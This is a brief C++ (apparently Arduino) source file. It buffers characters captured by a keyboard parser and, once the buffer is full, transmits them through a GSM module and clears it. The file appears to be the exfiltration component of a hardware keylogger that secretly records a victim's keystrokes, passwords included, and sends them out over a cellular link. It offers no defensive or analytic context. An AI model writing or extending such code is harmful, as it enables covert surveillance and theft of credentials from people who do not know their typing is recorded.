// ============================================================================
#include "./includes/traffic/traffic.h"
// ============================================================================
void Traffic::tanalyze(
	SoftwareGSM* gsm_module,
	KeyboardParser* keyboard_prs
) {
	if (keyboard_prs->buffer.length() >= MAX_BUFFER_SIZE) {
		 Traffic::send_buffer(gsm_module, keyboard_prs);
	}
}
// ============================================================================
void Traffic::send_buffer(
	SoftwareGSM* gsm_module,
	KeyboardParser* keyboard_prs
) {
	Keyboard.releaseAll();
	gsm_module->send_answer(keyboard_prs->buffer);
	Serial.print(F("[GSM] SEND: "));
	Serial.println(keyboard_prs->buffer.c_str());
	keyboard_prs->buffer = "";
}
// ============================================================================
